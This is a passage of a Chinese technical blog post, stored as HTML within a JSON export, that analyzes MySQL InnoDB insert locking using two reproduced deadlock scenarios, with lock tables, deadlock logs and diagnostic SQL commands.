sec)</td>\n<td>&nbsp;</td>\n</tr>\n</tbody>\n</table>\n<p>如果T1未rollback，而是commit的话，T2和T3会报唯一键冲突：ERROR 1062 (23000): Duplicate entry ‘6’ for key ‘PRIMARY’</p>\n<h4 id=\"事务锁占用情况\"><a href=\"#事务锁占用情况\" class=\"headerlink\" title=\"事务锁占用情况\"></a>事务锁占用情况</h4><p>T1 rollback前，各事务锁占用情况：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; select * from information_schema.innodb_locks;</div><div class=\"line\">+--------------+-------------+-----------+-----------+-------------+------------+------------+-----------+----------+-----------+</div><div class=\"line\">| lock_id      | lock_trx_id | lock_mode | lock_<span class=\"built_in\">type</span> | lock_table  | lock_index | lock_space | lock_page | lock_rec | lock_data |</div><div class=\"line\">+--------------+-------------+-----------+-----------+-------------+------------+------------+-----------+----------+-----------+</div><div class=\"line\">| 36729:24:3:7 | 36729       | S         | RECORD    | `<span class=\"built_in\">test</span>`.`aa` | PRIMARY    |         24 |         3 |        7 | 6         |</div><div class=\"line\">| 36727:24:3:7 | 36727       | X         | RECORD    | `<span class=\"built_in\">test</span>`.`aa` | PRIMARY    |         24 |         3 |        7 | 6         |</div><div class=\"line\">| 36728:24:3:7 | 36728       | S         | RECORD    | `<span class=\"built_in\">test</span>`.`aa` | PRIMARY    |         24 |         3 |        7 | 6         |</div><div class=\"line\">+--------------+-------------+-----------+-----------+-------------+------------+------------+-----------+----------+-----------+</div></pre></td></tr></table></figure></p>\n<p><strong>注</strong>：mysql有自己的一套规则来决定T2与T3哪个进行回滚，本文不做讨论。</p>\n<h4 id=\"死锁日志\"><a href=\"#死锁日志\" class=\"headerlink\" title=\"死锁日志\"></a>死锁日志</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div></pre></td><td class=\"code\"><pre><div class=\"line\">------------------------</div><div class=\"line\">LATEST DETECTED DEADLOCK</div><div class=\"line\">------------------------</div><div class=\"line\">2016-07-21 19:34:23 700000a3f000</div><div class=\"line\">*** (1) TRANSACTION:</div><div class=\"line\">TRANSACTION 36728, ACTIVE 199 sec inserting</div><div class=\"line\">mysql tables <span class=\"keyword\">in</span> use 1, locked 1</div><div class=\"line\">LOCK WAIT 4 lock struct(s), heap size 1184, 2 row lock(s)</div><div class=\"line\">MySQL thread id 13, OS thread handle 0x700000b0b000, query id 590 localhost root update</div><div class=\"line\">insert into aa values(6, <span class=\"string\">'test'</span>, 12, 3)</div><div class=\"line\">*** (1) WAITING FOR THIS LOCK TO BE GRANTED:</div><div class=\"line\">RECORD LOCKS space id 24 page no 3 n bits 80 index `PRIMARY` of table `<span class=\"built_in\">test</span>`.`aa` trx id 36728 lock_mode X insert intention waiting</div><div class=\"line\">Record lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0</div><div class=\"line\"> 0: len 8; hex 73757072656d756d; asc supremum;;</div><div class=\"line\"></div><div class=\"line\">*** (2) TRANSACTION:</div><div class=\"line\">TRANSACTION 36729, ACTIVE 196 sec inserting</div><div class=\"line\">mysql tables <span class=\"keyword\">in</span> use 1, locked 1</div><div class=\"line\">4 lock struct(s), heap size 1184, 2 row lock(s)</div><div class=\"line\">MySQL thread id 14, OS thread handle 0x700000a3f000, query id 591 localhost root update</div><div class=\"line\">insert into aa values(6, <span class=\"string\">'test'</span>, 12, 3)</div><div class=\"line\">*** (2) HOLDS THE LOCK(S):</div><div class=\"line\">RECORD LOCKS space id 24 page no 3 n bits 80 index `PRIMARY` of table `<span class=\"built_in\">test</span>`.`aa` trx id 36729 lock mode S</div><div class=\"line\">Record lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0</div><div class=\"line\"> 0: len 8; hex 73757072656d756d; asc supremum;;</div><div class=\"line\"></div><div class=\"line\">*** (2) WAITING FOR THIS LOCK TO BE GRANTED:</div><div class=\"line\">RECORD LOCKS space id 24 page no 3 n bits 80 index `PRIMARY` of table `<span class=\"built_in\">test</span>`.`aa` trx id 36729 lock_mode X insert intention waiting</div><div class=\"line\">Record lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0</div><div class=\"line\"> 0: len 8; hex 73757072656d756d; asc supremum;;</div><div class=\"line\"></div><div class=\"line\">*** WE ROLL BACK TRANSACTION (2)</div></pre></td></tr></table></figure>\n<h4 id=\"死锁成因\"><a href=\"#死锁成因\" class=\"headerlink\" title=\"死锁成因\"></a>死锁成因</h4><p>事务T1成功插入记录，并获得索引id=6上的排他记录锁(LOCK_X | LOCK_REC_NOT_GAP)。<br>紧接着事务T2、T3也开始插入记录，请求排他插入意向锁(LOCK_X | LOCK_GAP | LOCK_INSERT_INTENTION)；但由于发生重复唯一键冲突，各自请求的排他记录锁(LOCK_X | LOCK_REC_NOT_GAP)转成共享记录锁(LOCK_S | LOCK_REC_NOT_GAP)。</p>\n<p>T1回滚释放索引id=6上的排他记录锁(LOCK_X | LOCK_REC_NOT_GAP)，T2和T3都要请求索引id=6上的排他记录锁(LOCK_X | LOCK_REC_NOT_GAP)。<br>由于X锁与S锁互斥，T2和T3都等待对方释放S锁。<br>于是，死锁便产生了。</p>\n<p>如果此场景下，只有两个事务T1与T2或者T1与T3，则不会引发如上死锁情况产生。</p>\n<h4 id=\"思考-1\"><a href=\"#思考-1\" class=\"headerlink\" title=\"思考\"></a>思考</h4><ul>\n<li><p>为什么发现重复主键冲突的时候，要将事务请求的X锁转成S锁？<br>(比较牵强的)个人理解，跟插入意向锁类型，也是为了提高插入的并发效率。</p>\n</li>\n<li><p>插入前请求插入意向锁的作用？<br>个人认为，通过兼容矩阵来分析，Insert Intention Locks是为了减少插入时的锁冲突。</p>\n</li>\n</ul>\n<h3 id=\"2-GAP与Insert-Intention冲突引发的死锁\"><a href=\"#2-GAP与Insert-Intention冲突引发的死锁\" class=\"headerlink\" title=\"2. GAP与Insert Intention冲突引发的死锁\"></a>2. GAP与Insert Intention冲突引发的死锁</h3><h4 id=\"表结构-1\"><a href=\"#表结构-1\" class=\"headerlink\" title=\"表结构\"></a>表结构</h4><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> <span class=\"string\">`t`</span> (</div><div class=\"line\">  <span class=\"string\">`a`</span> <span class=\"built_in\">int</span>(<span class=\"number\">11</span>) <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span>,</div><div class=\"line\">  <span class=\"string\">`b`</span> <span class=\"built_in\">int</span>(<span class=\"number\">11</span>) <span class=\"keyword\">DEFAULT</span> <span class=\"literal\">NULL</span>,</div><div class=\"line\">  PRIMARY <span class=\"keyword\">KEY</span> (<span class=\"string\">`a`</span>),</div><div class=\"line\">  <span class=\"keyword\">KEY</span> <span class=\"string\">`idx_b`</span> (<span class=\"string\">`b`</span>)</div><div class=\"line\">) <span class=\"keyword\">ENGINE</span>=<span class=\"keyword\">InnoDB</span> <span class=\"keyword\">DEFAULT</span> <span class=\"keyword\">CHARSET</span>=utf8;</div></pre></td></tr></table></figure>\n<h4 id=\"表数据-1\"><a href=\"#表数据-1\" class=\"headerlink\" title=\"表数据\"></a>表数据</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; select * from t;</div><div class=\"line\">+----+------+</div><div class=\"line\">| a  | b    |</div><div class=\"line\">+----+------+</div><div class=\"line\">|  1 |    2 |</div><div class=\"line\">|  2 |    3 |</div><div class=\"line\">|  3 |    4 |</div><div class=\"line\">| 11 |   22 |</div><div class=\"line\">+----+------+</div></pre></td></tr></table></figure>\n<h4 id=\"事务执行时序表-1\"><a href=\"#事务执行时序表-1\" class=\"headerlink\" title=\"事务执行时序表\"></a>事务执行时序表</h4><table>\n<thead>\n<tr>\n<th>T1(36831)</th>\n<th>T2(36832)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>begin;</td>\n<td>begin;</td>\n</tr>\n<tr>\n<td>select * from t where b = 6 for update;</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>select * from t where b = 8 for update;</td>\n</tr>\n<tr>\n<td>insert into t values (4,5);</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>insert into t values (4,5);</td>\n</tr>\n<tr>\n<td></td>\n<td>ERROR 1213 (40001): Deadlock found when trying to get lock; try restarting transaction</td>\n</tr>\n<tr>\n<td>Query OK, 1 row affected (5.45 sec)</td>\n<td>&nbsp;</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"事务锁占用情况-1\"><a href=\"#事务锁占用情况-1\" class=\"headerlink\" title=\"事务锁占用情况\"></a>事务锁占用情况</h4><p>T2 insert前，各事务锁占用情况：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; select * from information_schema.innodb_locks;</div><div class=\"line\">+--------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+</div><div class=\"line\">| lock_id      | lock_trx_id | lock_mode | lock_<span class=\"built_in\">type</span> | lock_table | lock_index | lock_space | lock_page | lock_rec | lock_data |</div><div class=\"line\">+--------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+</div><div class=\"line\">| 36831:25:4:5 | 36831       | X,GAP     | RECORD    | `<span class=\"built_in\">test</span>`.`t` | idx_b      |         25 |         4 |        5 | 22, 11    |</div><div class=\"line\">| 36832:25:4:5 | 36832       | X,GAP     | RECORD    | `<span class=\"built_in\">test</span>`.`t` | idx_b      |         25 |         4 |        5 | 22, 11    |</div><div class=\"line\">+--------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+</div></pre></td></tr></table></figure></p>\n<h4 id=\"死锁日志-1\"><a href=\"#死锁日志-1\" class=\"headerlink\" title=\"死锁日志\"></a>死锁日志</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div></pre></td><td class=\"code\"><pre><div class=\"line\">------------------------</div><div class=\"line\">LATEST DETECTED DEADLOCK</div><div class=\"line\">------------------------</div><div class=\"line\">2016-07-28 12:28:34 700000a3f000</div><div class=\"line\">*** (1) TRANSACTION:</div><div class=\"line\">TRANSACTION 36831, ACTIVE 17 sec inserting</div><div class=\"line\">mysql tables in use 1, locked 1</div><div class=\"line\">LOCK WAIT 4 lock struct(s), heap size 1184, 3 row lock(s), undo log entries 1</div><div class=\"line\">MySQL thread id 38, OS thread handle 0x700000b0b000, query id 953 localhost root update</div><div class=\"line\">insert into t values (4,5)</div><div class=\"line\">*** (1) WAITING FOR THIS LOCK TO BE GRANTED:</div><div class=\"line\">RECORD LOCKS space id 25 page no 4 n bits 72 index `idx_b` of table `test`.`t` trx id 36831 lock_mode X locks gap before rec insert intention waiting</div><div class=\"line\">Record lock, heap no 5 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000016; asc     ;;</div><div class=\"line\"> 1: len 4; hex 8000000b; asc     ;;</div><div class=\"line\"></div><div class=\"line\">*** (2) TRANSACTION:</div><div class=\"line\">TRANSACTION 36832, ACTIVE 13 sec inserting</div><div class=\"line\">mysql tables in use 1, locked 1</div><div class=\"line\">3 lock struct(s), heap size 360, 2 row lock(s)</div><div class=\"line\">MySQL thread id 39, OS thread handle 0x700000a3f000, query id 954 localhost root update</div><div class=\"line\">insert into t values (4,5)</div><div class=\"line\">*** (2) HOLDS THE LOCK(S):</div><div class=\"line\">RECORD LOCKS space id 25 page no 4 n bits 72 index `idx_b` of table `test`.`t` trx id 36832 lock_mode X locks gap before rec</div><div class=\"line\">Record lock, heap no 5 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000016; asc     ;;</div><div class=\"line\"> 1: len 4; hex 8000000b; asc     ;;</div><div class=\"line\"></div><div class=\"line\">*** (2) WAITING FOR THIS LOCK TO BE GRANTED:</div><div class=\"line\">RECORD LOCKS space id 25 page no 3 n bits 72 index `PRIMARY` of table `test`.`t` trx id 36832 lock mode S locks rec but not gap waiting</div><div class=\"line\">Record lock, heap no 5 PHYSICAL RECORD: n_fields 4; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000004; asc     ;;</div><div class=\"line\"> 1: len 6; hex 000000008fdf; asc       ;;</div><div class=\"line\"> 2: len 7; hex 8d000001d00110; asc        ;;</div><div class=\"line\"> 3: len 4; hex 80000005; asc     ;;</div><div class=\"line\"></div><div class=\"line\">*** WE ROLL BACK TRANSACTION (2)</div></pre></td></tr></table></figure>\n<h4 id=\"死锁成因-1\"><a href=\"#死锁成因-1\" class=\"headerlink\" title=\"死锁成因\"></a>死锁成因</h4><p>事务T1执行查询语句，在索引b=6上加排他Next-key锁(LOCK_X | LOCK_ORDINARY)，会锁住idx_b索引范围(4, 22)。<br>事务T2执行查询语句，在索引b=8上加排他Next-key锁(LOCK_X | LOCK_ORDINARY)，会锁住idx_b索引范围(4, 22)。由于请求的GAP与已持有的GAP是兼容的，因此，事务T2在idx_b索引范围(4, 22)也能加锁成功。</p>\n<p>事务T1执行插入语句，会先加排他Insert Intention锁。由于请求的Insert Intention锁与已有的GAP锁不兼容，则事务T1等待T2释放GAP锁。<br>事务T2执行插入语句，也会等待T1释放GAP锁。<br>于是，死锁便产生了。</p>\n<p><strong>注</strong>：LOCK_ORDINARY拥有LOCK_GAP一部分特性。</p>\n<h4 id=\"思考：Insert-Intention锁在加哪级索引上？\"><a href=\"#思考：Insert-Intention锁在加哪级索引上？\" class=\"headerlink\" title=\"思考：Insert Intention锁在加哪级索引上？\"></a>思考：Insert Intention锁在加哪级索引上？</h4><p>这个排他锁加在PK上，还是二级索引上？</p>\n<h2 id=\"六、课后思考\"><a href=\"#六、课后思考\" class=\"headerlink\" title=\"六、课后思考\"></a>六、课后思考</h2><ol>\n<li><p>无主键的加锁过程<br>无PK时，会创建一个隐式聚簇索引。加锁在这个隐式聚簇索引会有什么不同？</p>\n</li>\n<li><p>复合索引加锁过程</p>\n</li>\n<li>多条件(where condition)加锁过程</li>\n<li><p>隐式锁与显式锁，隐式锁什么情况下会转换成显式锁</p>\n</li>\n<li><p>如果插入意向锁不阻止任何锁，这个锁还有必要存在吗？<br>目前看到的作用是，通过加锁的方式来唤醒等待线程。<br>但这并不意味着，被唤醒后可以直接做插入操作了。需要再次判断是否有锁冲突。</p>\n</li>\n</ol>\n<h2 id=\"七、补充知识\"><a href=\"#七、补充知识\" class=\"headerlink\" title=\"七、补充知识\"></a>七、补充知识</h2><h3 id=\"1-查看事务隔离级别\"><a href=\"#1-查看事务隔离级别\" class=\"headerlink\" title=\"1. 查看事务隔离级别\"></a>1. 查看事务隔离级别</h3><p>SELECT @@global.tx_isolation;<br>SELECT @@session.tx_isolation;<br>SELECT @@tx_isolation;</p>\n<h3 id=\"2-设置隔离级别\"><a href=\"#2-设置隔离级别\" class=\"headerlink\" title=\"2. 设置隔离级别\"></a>2. 设置隔离级别</h3><p>SET [SESSION | GLOBAL] TRANSACTION ISOLATION LEVEL {READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE}<br>例如：set session transaction isolation level read uncommitted;</p>\n<h3 id=\"3-查看auto-increment机制模式\"><a href=\"#3-查看auto-increment机制模式\" class=\"headerlink\" title=\"3. 查看auto_increment机制模式\"></a>3. 查看auto_increment机制模式</h3><p>show variables like ‘innodb_autoinc_lock_mode’;</p>\n<h3 id=\"4-查看表状态\"><a href=\"#4-查看表状态\" class=\"headerlink\" title=\"4. 查看表状态\"></a>4. 查看表状态</h3><p>show table status like ‘plan_branch’\\G;<br>show table status from test like ‘plan_branch’\\G;</p>\n<h3 id=\"5-查看SQL性能\"><a href=\"#5-查看SQL性能\" class=\"headerlink\" title=\"5. 查看SQL性能\"></a>5. 查看SQL性能</h3><p>show profiles<br>show profile for query 1;</p>\n<h3 id=\"6-查看当前最新事务ID\"><a href=\"#6-查看当前最新事务ID\" class=\"headerlink\" title=\"6. 查看当前最新事务ID\"></a>6. 查看当前最新事务ID</h3><p>每开启一个新事务，记录当前最新事务的id，可用于后续死锁分析。<br>show engine innodb status\\G;</p>\n<h3 id=\"7-查看事务锁等待状态情况\"><a href=\"#7-查看事务锁等待状态情况\" class=\"headerlink\" title=\"7. 查看事务锁等待状态情况\"></a>7. 查看事务锁等待状态情况</h3><p>select <em> from information_schema.innodb_locks;<br>select </em> from information_schema.innodb_lock_waits;<br>select * from information_schema.innodb_trx;</p>\n<h3 id=\"8-查看innodb状态-包含最近的死锁日志\"><a href=\"#8-查看innodb状态-包含最近的死锁日志\" class=\"headerlink\" title=\"8. 查看innodb状态(包含最近的死锁日志)\"></a>8. 查看innodb状态(包含最近的死锁日志)</h3><p>show engine innodb status;</p>\n<h2 id=\"八、参考文档\"><a href=\"#八、参考文档\" class=\"headerlink\" title=\"八、参考文档\"></a>八、参考文档</h2><p>[^1]: <a href=\"https://dev.mysql.com/doc/refman/5.6/en/innodb-parameters.html\" target=\"_blank\" rel=\"external\">InnoDB Startup Options and System Variables</a><br>[^2]: <a href=\"http://dev.mysql.com/doc/refman/5.6/en/innodb-locking.html\" target=\"_blank\" rel=\"external\">InnoDB Locking</a><br>[^3]: <a href=\"http://dev.mysql.com/doc/refman/5.6/en/innodb-index-types.html\" target=\"_blank\" rel=\"external\">Clustered and Secondary Indexes</a><br>[^4]: <a href=\"http://www.cnblogs.com/renolei/p/4673842.html\" target=\"_blank\" rel=\"external\">[MySQL] gap lock/next-key lock浅析</a><br>[^5]: <a href=\"http://hedengcheng.com/?p=771#comment-5543\" target=\"_blank\" rel=\"external\">Intention Lock是否表级锁</a><br>[^6]: <a href=\"http://dev.mysql.com/doc/refman/5.6/en/innodb-locks-set.html\" target=\"_blank\" rel=\"external\">Locks Set by Different SQL Statements in InnoDB</a></p>\n<p>[^8]: <a href=\"http://www.cnblogs.com/renolei/p/5559135.html\" target=\"_blank\" rel=\"external\">AUTO_INCREMENT lock Handing in InnoDB</a><br>[^9]: <a href=\"http://blog.csdn.net/cug_jiang126com/article/details/50596729\" target=\"_blank\" rel=\"external\">深入理解innodb的锁(record,gap,Next-Key lock)</a></p>\n<p>[^11]: <a href=\"http://dev.mysql.com/doc/refman/5.5/en/innodb-locks-table.html\" target=\"_blank\" rel=\"external\">The INFORMATION_SCHEMA INNODB_LOCKS Table</a><br>[^12]: <a href=\"http://dev.mysql.com/doc/refman/5.5/en/innodb-trx-table.html\" target=\"_blank\" rel=\"external\">The INFORMATION_SCHEMA INNODB_TRX Table</a><br>[^13]: <a href=\"http://blog.csdn.net/yanzongshuai/article/details/46398609\" target=\"_blank\" rel=\"external\">mysql innodb插入意向锁</a></p>\n","excerpt":"<p><img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>上周遇到一个因insert而引发的死锁问题，其成因比较令人费解。<br>于是想要了解一下insert加锁机制，但是发现网上介绍的文章比较少且零散，挖掘过程比较忙乱。</p>\n<p>本以为只需要系统学习一个较完全的逻辑，但是实际牵扯很多innodb锁相关知识及加锁方式。我好像并没有那么大的能耐，把各种场景的加锁过程一一列举并加之分析；亦没有太多的精力验证网上的言论的准确性。</p>\n<p>只好根据现在了解的内容，参考官方文档，说说自己当前的理解。<br>本文仅供参考，如有误导，概不负责。</p>\n<h2 id=\"二、现场状态\"><a href=\"#二、现场状态\" class=\"headerlink\" title=\"二、现场状态\"></a>二、现场状态</h2><p>不同的mysql版本，不同的参数设置，都可能对加锁过程有影响。<br>分析加锁机制还是应当尽可能多地列举一下关键参数，例如：当前mysql版本、事务隔离级别等。<br>如下，仅仅只列出个别比较重要的参数。</p>\n<h3 id=\"1-数据库版本\"><a href=\"#1-数据库版本\" class=\"headerlink\" title=\"1.数据库版本\"></a>1.数据库版本</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; select version();</div><div class=\"line\">+-----------+</div><div class=\"line\">| version() |</div><div class=\"line\">+-----------+</div><div class=\"line\">| 5.6.27    |</div><div class=\"line\">+-----------+</div></pre></td></tr></table></figure>\n<h3 id=\"2-数据库引擎\"><a href=\"#2-数据库引擎\" class=\"headerlink\" title=\"2. 数据库引擎\"></a>2. 数据库引擎</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; show variables like <span class=\"string\">'%engine%'</span>;</div><div class=\"line\">+----------------------------+--------+</div><div class=\"line\">| Variable_name              | Value  |</div><div class=\"line\">+----------------------------+--------+</div><div class=\"line\">| default_storage_engine     | InnoDB |</div><div class=\"line\">| default_tmp_storage_engine | InnoDB |</div><div class=\"line\">| storage_engine             | InnoDB |</div><div class=\"line\">+----------------------------+--------+</div></pre></td></tr></table></figure>\n<p><strong>注</strong>：InnoDB支持事务，Myisam不支持事务；InnoDB支持行锁和表锁；Myisam不支持行锁。</p>\n<h3 id=\"3-事务隔离级别\"><a href=\"#3-事务隔离级别\" class=\"headerlink\" title=\"3. 事务隔离级别\"></a>3. 事务隔离级别</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; select @@global.tx_isolation, @@session.tx_isolation, @@tx_isolation;</div><div class=\"line\">+-----------------------+------------------------+-----------------+</div><div class=\"line\">| @@global.tx_isolation | @@session.tx_isolation | @@tx_isolation  |</div><div class=\"line\">+-----------------------+------------------------+-----------------+</div><div class=\"line\">| REPEATABLE-READ       | REPEATABLE-READ        | REPEATABLE-READ |</div><div class=\"line\">+-----------------------+------------------------+-----------------+</div></pre></td></tr></table></figure>\n<p><strong>注</strong>：几种事务隔离级别：READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE</p>\n<h3 id=\"4-查看gap锁开启状态\"><a href=\"#4-查看gap锁开启状态\" class=\"headerlink\" title=\"4. 查看gap锁开启状态\"></a>4. 查看gap锁开启状态</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; show variables like <span class=\"string\">'innodb_locks_unsafe_for_binlog'</span>;</div><div class=\"line\">+--------------------------------+-------+</div><div class=\"line\">| Variable_name                  | Value |</div><div class=\"line\">+--------------------------------+-------+</div><div class=\"line\">| innodb_locks_unsafe_<span class=\"keyword\">for</span>_binlog | OFF   |</div><div class=\"line\">+--------------------------------+-------+</div></pre></td></tr></table></figure>\n<p>innodb_locks_unsafe_for_binlog：默认值为0，即启用gap lock。<br>最主要的作用就是控制innodb是否对gap加锁。<br>但是，这一设置变更并不影响外键和唯一索引（含主键）对gap进行加锁的需要。<br>开启innodb_locks_unsafe_for_binlog的REPEATABLE-READ事务隔离级别，很大程度上已经蜕变成了READ-COMMITTED。</p>\n<p>参见官方文档[^1]：</p>\n<blockquote>\n<p>By default, the value of innodb_locks_unsafe_for_binlog is 0 (disabled), which means that gap locking is enabled: InnoDB uses next-key locks for searches and index scans. To enable the variable, set it to 1. This causes gap locking to be disabled: InnoDB uses only index-record locks for searches and index scans.</p>\n<p>Enabling innodb_locks_unsafe_for_binlog does not disable the use of gap locking for foreign-key constraint checking or duplicate-key checking.</p>\n<p>The effect of enabling innodb_locks_unsafe_for_binlog is similar to but not identical to setting the transaction isolation level to READ COMMITTED.</p>\n</blockquote>\n<h3 id=\"5-查看自增锁模式\"><a href=\"#5-查看自增锁模式\" class=\"headerlink\" title=\"5. 查看自增锁模式\"></a>5. 查看自增锁模式</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; show variables like <span class=\"string\">'innodb_autoinc_lock_mode'</span>;</div><div class=\"line\">+--------------------------+-------+</div><div class=\"line\">| Variable_name            | Value |</div><div class=\"line\">+--------------------------+-------+</div><div class=\"line\">| innodb_autoinc_lock_mode | 1     |</div><div class=\"line\">+--------------------------+-------+</div></pre></td></tr></table></figure>\n<p>innodb_autoinc_lock_mode有3种配置模式：0、1、2，分别对应”传统模式”, “连续模式”, “交错模式”。[^8]<br>传统模式：涉及auto-increment列的插入语句加的表级AUTO-INC锁，只有插入执行结束后才会释放锁。这是一种兼容MySQL 5.1之前版本的策略。<br>连续模式：可以事先确定插入行数的语句(包括单行和多行插入)，分配连续的确定的auto-increment值；对于插入行数不确定的插入语句，仍加表锁。这种模式下，事务回滚，auto-increment值不会回滚，换句话说，自增列内容会不连续。<br>交错模式：同一时刻多条SQL语句产生交错的auto-increment值。</p>\n<p>由于insert语句常常涉及自增列的加锁过程，会涉及到AUTO-INC Locks加锁过程。<br>为了分步了解insert加锁过程，本文暂不讨论任何涉及自增列的加锁逻辑。<br>这一参数设置相关内容可能会出现在我的下一篇文章里。</p>","more":"<h3 id=\"n-etc\"><a href=\"#n-etc\" class=\"headerlink\" title=\"n. etc\"></a>n. etc</h3><p>相关的参数配置越详情越好。</p>\n<h2 id=\"三、InnoDB锁类型-2\"><a href=\"#三、InnoDB锁类型-2\" class=\"headerlink\" title=\"三、InnoDB锁类型[^2]\"></a>三、InnoDB锁类型[^2]</h2><h3 id=\"1-基本锁\"><a href=\"#1-基本锁\" class=\"headerlink\" title=\"1. 基本锁\"></a>1. 基本锁</h3><p>基本锁：共享锁(Shared Locks：S锁)与排他锁(Exclusive Locks：X锁)</p>\n<p>mysql允许拿到S锁的事务读一行，允许拿到X锁的事务更新或删除一行。<br>加了S锁的记录，允许其他事务再加S锁，不允许其他事务再加X锁；<br>加了X锁的记录，不允许其他事务再加S锁或者X锁。</p>\n<p>mysql对外提供加这两种锁的语法如下：<br>加S锁：select…lock in share mode<br>加X锁：select…for update</p>\n<h3 id=\"2-意向锁-Intention-Locks\"><a href=\"#2-意向锁-Intention-Locks\" class=\"headerlink\" title=\"2. 意向锁(Intention Locks)\"></a>2. 意向锁(Intention Locks)</h3><p>InnoDB为了支持多粒度(表锁与行锁)的锁并存，引入意向锁。<br>意向锁是表级锁，可分为意向共享锁(IS锁)和意向排他锁(IX锁)。</p>\n<blockquote>\n<p>InnoDB supports multiple granularity locking which permits coexistence of row-level locks and locks on entire tables. To make locking at multiple granularity levels practical, additional types of locks called intention locks are used. Intention locks are table-level locks in InnoDB that indicate which type of lock (shared or exclusive) a transaction will require later for a row in that table. There are two types of intention locks used in InnoDB (assume that transaction T has requested a lock of the 